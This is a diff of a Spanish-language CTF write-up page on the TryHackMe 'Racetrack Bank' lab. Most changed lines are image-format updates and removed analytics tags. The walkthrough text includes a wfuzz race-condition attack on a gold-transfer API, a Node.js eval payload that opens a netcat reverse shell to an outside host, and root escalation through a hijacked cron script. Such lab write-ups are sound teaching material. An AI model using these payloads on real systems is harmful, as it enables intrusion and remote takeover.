@@ -1249,8 +1249,8 @@
 <meta property="og:description" content="Writeups para maquinas de TryHackMe, HackTheBox, CTFs">
 
   
-    <meta property="og:image" content="https://sckull.github.io/images/posts/thm/racetrackbank/cover.png">
-    <meta property="og:image:url" content="https://sckull.github.io/images/posts/thm/racetrackbank/cover.png">
+    <meta property="og:image" content="https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp">
+    <meta property="og:image:url" content="https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:app:name:iphone" content="sckull">
     <meta property="twitter:title" content="TryHackMe - Racetrack Bank">
@@ -1286,7 +1286,7 @@
     "url" : "https://sckull.github.io/posts/racetrackbank/",
     "description": "Racetrack Bank es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.",
     "keywords": ["linux"],
-    "image" : "https://sckull.github.io/images/posts/thm/racetrackbank/cover.png",
+    "image" : "https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp",
     "author": {
       "@type": "Person",
       "name": "sckull"
@@ -1316,18 +1316,6 @@
     
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet"> 
 
-
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-2M568SGK9N"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-2M568SGK9N');
-</script>
-
-
-<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />
 
 </head>
 
@@ -1574,7 +1562,7 @@
 
 
   <div class="featured-image__wrapper">
-    <img src="/images/posts/thm/racetrackbank/cover.png" alt="featured image" class="featured-image" style="width: ;height: ;">
+    <img src="/images/posts/thm/racetrackbank/cover.webp" alt="featured image" class="featured-image" style="width: ;height: ;">
   </div>
 
 <h3 id="informacion-de-la-maquina">Informacion de la Maquina</h3>
@@ -1637,7 +1625,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div>
 </div><h2 id="http">HTTP</h2>
 <p>En el puerto 80 encontramos una pagina en la que vemos una pagina sencilla<br />
-<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_162323.png" alt="image" /></p>
+<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_162323.webp" alt="image" /></p>
 <h2 id="gobuster">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
@@ -1671,51 +1659,51 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre></td></tr></table>
 </div>
 </div><p>Creamos una cuenta en la pagina y al iniciar sesion nos encontramos con un mensaje en el que indica que nos han dado <code>1 Gold</code> y en la parte superior derecha vemos la cantidad.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_174359.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_174359.webp" alt="image" /></p>
 <p>Tambien vemos la pagina de <code>Purchase</code> y <code>Give Gold</code>, en la primera podemos comprar una cuenta premium, en la segunda podemos regalar a un usuario <code>Golds</code> segun la cantidad que querramos.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_174539.png" alt="image" /></p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_174615.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_174539.webp" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_174615.webp" alt="image" /></p>
 <p>Al analizar el codigo fuente de estas paginas, encontramos que existe una tercera pagina <code>premiumfeatures.html</code> en la cual no tenemos acceso.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_174728.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_174728.webp" alt="image" /></p>
 <p>Analizamos las peticiones con Burpsuite y vemos que en el header de la respuesta <code>Express</code> por lo que podemos deducir que la pagina esta corriendo en NodeJS.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_175108.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_175108.webp" alt="image" /></p>
 <h2 id="transferencia-asincrona-gold---wfuzz">Transferencia Asincrona GOLD - WFUZZ</h2>
 <p>Creamos una segunda cuenta, para poder regalar <code>Gold</code> a esta desde la primera cuenta. Le damos <code>1 Gold</code> a pika desde test, y al hacer esto, test se queda en 0 y pika tiene 2, entonces, dependiendo de cuantas <code>Gold</code> tengamos, esa cantidad podemos regalar, hay que mencionar que se tarda en realizar la transaccion.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_175340.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_175340.webp" alt="image" /></p>
 <p>Hasta este punto, no habia otra parte en donde podriamos realizar alguna explotacion, por lo que <em>podríamos</em> crear 10 mil cuentas y utilizar esas cuentas para dar a una sola los <code>10,000 Gold</code> para comprar una cuenta premium y ver lo que hay ahí pero no seria lo mejor.</p>
 <p>Regresamos y revisamos el nombre de la maquina para ver si tenemos una alguna pista como en la maquina <a href="sckull.github.io/posts/mango/"><strong>Mango - HackTheBox</strong></a> que en su nombre nos indicaba la base de datos <code>Mongo</code>, en el caso de esta maquina nos menciona <code>Racetrack</code> que al investigar acerca de este nombre podría hacer referencia al paquete <a href="https://www.npmjs.com/package/racetrack"><strong>racetrack - npm</strong></a> que se encarga de verificar las peticiones <strong>asincronas</strong>.</p>
 <p>Haciendo referencia a la funcionalidad <a href="https://developer.mozilla.org/es/docs/Glossary/As%C3%ADncrono"><code>Asíncrona</code></a> del paquete, utilizamos <code>wfuzz</code> para realizar multiples peticiones en las que realizamos una <code>transferencia de Gold</code> de una cuenta a otra. Utilizamos un diccionario en el cual tenemos mil lineas con el numero <code>1</code> para poder utilizar en el parametro <code>FUZZ</code> necesario en wfuzz. Pero primero capturamos la peticion de transferencia y eliminamos los elementos del header que no son necesarios, la sintaxis quedaría de la siguiente forma:</p>
 <p>Transaccion de <code>pika a test</code></p>
 <pre><code>wfuzz -u http://racetrackbank.thm/api/givegold -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -b &quot;connect.sid=s%3A1WZ2nxR7AU8055fkeBW_cLlTaLFVV6Sk.zoPUEOLRtqGfnyd291VT%2BJuzMlkFKT6NAxVjuSExNsY&quot; -d &quot;user=test&amp;amount=FUZZ&quot;
 </code></pre><p>Al ejecutar esto obtenemos multiples respuestas <code>302</code>, en donde las primeras diez tienen menos caracteres (agregamos <code>--sh 54</code> a wfuzz) que las siguientes.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_184712.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_184712.webp" alt="image" /></p>
 <p>Revisamos la cuenta de <code>test</code> y vemos que tenemos más <code>Gold</code>, por lo que es muy probable que tenga la funcionalidad asincrona.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_185039.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_185039.webp" alt="image" /></p>
 <p>Ahora realizamos una transaccion de <code>test a pika</code> y volvemos a hacer lo mismo con wfuzz (aumentamos 5 en 5 nuestro diccionario) asi hasta lograr los <code>Gold</code> necesarios para una cuenta premium en la cuenta test. Por alguna razon al realizar esta &ldquo;explotacion&rdquo; en ambas cuentas aumentan los <code>Gold</code>.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_191944.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_191944.webp" alt="image" /></p>
 <h3 id="brian-user---rce-nodejs">BRIAN USER - RCE NodeJS</h3>
 <p>Hacemos la compra de una cuenta Premium, y podemos acceder a la pagina <code>Premium Features</code> donde encontramos un input que al ingresar una operacion matematica nos devuelve el resultado.</p>
 <p><a href="https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44"><strong>NODEJS RCE</strong></a></p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_192105.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_192105.webp" alt="image" /></p>
 <p>Utilizamos el payload <code>process.cwd()</code> para verificar el PATH donde esta la pagina ejecutandose, nos devuelve la carpeta principal de uno de los usuarios, el payload funciona y podemos intentar obtener una shell utilizando <code>require()</code>.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_192647.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_192647.webp" alt="image" /></p>
 <p>Ponemos a la escucha nuestro netcat (<code>rlwrap nc -lvp 1338</code>) y ejecutamos nuestro payload en la pagina <code>require(&quot;child_process&quot;).exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1338 &gt;/tmp/f')</code> utilizando burpsuite, codificamos nuestro payload.</p>
 <p>Logramos obtener una shell y nuestra flag <strong>user.txt</strong>.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_193746.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_193746.webp" alt="image" /></p>
 <p>Vemos el codigo fuente de la pagina <code>PremiumFeatures</code> donde eval esta presente.<br />
-<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_195548.png" alt="image" /></p>
+<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_195548.webp" alt="image" /></p>
 <p>Tambien encontramos las credenciales de la base de datos<br />
-<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_195734.png" alt="image" /></p>
+<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_195734.webp" alt="image" /></p>
 <h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
 <p>Dentro de la maquina encontramos un binario el cual tiene permisos root, pero al anlizarlo y ejecutarlo no se pudo hacer mayor cosa.<br />
-<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_204759.png" alt="image" /></p>
+<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_204759.webp" alt="image" /></p>
 <p>Utilizamos pspy para ver los cron job, y encontramos uno que ejecuta <code>cleanupscript.sh</code> que se encuentra en <code>/home/brian/cleanup/</code>.<br />
-<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_204512.png" alt="image" /></p>
+<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_204512.webp" alt="image" /></p>
 <p>Cambiamos de nombre al archivo, creamos uno nuevo con el mismo nombre y agregamos un comando para obtener la flag root.txt, esperamos y obtuvimos el contenido.</p>
-<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_204636.png" alt="image" /><br />
-<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_204657.png" alt="image" /></p>
+<p><img src="/images/posts/thm/racetrackbank/Screenshot_20200512_204636.webp" alt="image" /><br />
+<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_204657.webp" alt="image" /></p>
 <p>Agregamos una shell inversa al archivo y obtenemos una shell con usuario root.<br />
-<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_205221.png" alt="image" /></p>
+<img src="/images/posts/thm/racetrackbank/Screenshot_20200512_205221.webp" alt="image" /></p>
 
     </article>
     
